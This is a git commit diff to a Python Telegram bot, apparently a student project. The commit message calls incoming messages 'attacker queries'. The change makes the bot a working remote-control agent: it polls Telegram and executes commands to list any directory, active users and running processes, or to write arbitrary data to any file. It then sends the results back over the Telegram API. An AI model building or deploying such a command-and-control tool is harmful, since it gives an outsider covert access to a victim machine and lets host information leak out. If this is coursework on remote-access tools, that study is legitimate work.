7f6e9ab2410298e9cfdff6d425ec71288ed0774c
Petr Bergmann <bergmpet@fel.cvut.cz>
2020-01-07 00:48:40 +0100

    Sending messages with answers to attacker queries is done

--- bot.py
+++ bot.py
@@ -4,7 +4,10 @@ import json
 from authorization import TOKEN
 
 URL = "https://api.telegram.org/bot{}".format(TOKEN)
-output = "<b>Directory Listing</b>\n<i>Dir: {}</i>\n<b>Items:</b>\n\n"
+DIR_HTML = "<b>Directory Listing</b>\n<i>Dir: {}</i>\n<b>Items:</b>\n\n"
+USR_HTML = "<b>Active Users Listing</b>\n<b>Users:</b>\n\n"
+PCS_HTML = "<b>Running Processes Listing</b>\n<b>Processes:</b>\n\n"
+WRT_HTML = "<b>Write Status: </b>"
 MAX_MESSAGE_LENGTH = 4000
 
 
@@ -41,7 +44,11 @@ def get_updates():
 
 
 def list_files(path):
-    return os.listdir(path)
+    try:
+        return '\n'.join(os.listdir(path))
+    except FileNotFoundError:
+        print("No such directory")
+        return "Err: No such dir"
 
 
 def get_active_users():
@@ -53,33 +60,45 @@ def get_active_users():
     for line in stream.readlines():
         splitted = line.split()
         users.append(splitted[0])
-    return users
+    return '\n'.join(users)
 
 
 def get_running_processes():
-    stream = os.popen('ps -aux')
+    #stream = os.popen('ps -aux')
+    stream = os.popen('ps')
     stream.readline()  # get rid of a header and stats
 
     processes = []
     for line in stream.readlines():
         splitted = line.split()
         processes.append(splitted[-1])
-    return processes
+    return '\n'.join(processes)
 
 
 def write_to_file(file, data):
-    stream = os.popen('echo {} > {}'.format(data, file))
+    try:
+        f = open(file, "w")
+        f.write(data)
+        f.close()
+        return "Ok"
+    except FileNotFoundError:
+        print("No such dir")
+        return "Err: No such dir"
 
 
 def parse_payload(command):
-    if command == "ls":
-        files = list_files("./")
-        out = output
-        for file in files:
-            out = out + file + "\n"
-        print(files)
-        return out
-    return None
+    splitted = command.split(" ")
+    if splitted[0] == "ls" and len(splitted) >= 2:
+        files = list_files(splitted[1])
+        return DIR_HTML + files
+    elif splitted[0] == "users":
+        return USR_HTML + get_active_users()
+    elif splitted[0] == "processes":
+        return PCS_HTML + get_running_processes()
+    elif splitted[0] == "write" and len(splitted) >= 3:
+        return write_to_file(splitted[1], splitted[2])
+    else:
+        return "Wrong command"
 
 
 def send_answer(message, chat_id):
@@ -98,25 +117,18 @@ def send_answer(message, chat_id):
 
 
 if __name__ == "__main__":
-    # test of new methods
-    print(get_active_users())
-    print(get_running_processes())
-    write_to_file("out.txt", "TEST")
+    update_id = 0
+    for update in get_updates():
+        update_id = update["update_id"] + 1
+        message = update["message"]
+        chat_id = message["chat"]["id"]
+        print(update)
 
+        response = parse_payload(message["text"])
+        if response is None:
+            continue
 
-    # update_id = 0
-    #
-    # for update in get_updates():
-    #     update_id = update["update_id"] + 1
-    #     message = update["message"]
-    #     chat_id = message["chat"]["id"]
-    #     print(update)
-    #
-    #     response = parse_payload(message["text"])
-    #     if response is None:
-    #         continue
-    #
-    #     print(response)
-    #     send_answer(response, chat_id)
+        print(response)
+        send_answer(response, chat_id)
 
-    # mark_read(update_id)
+    #mark_read(update_id)
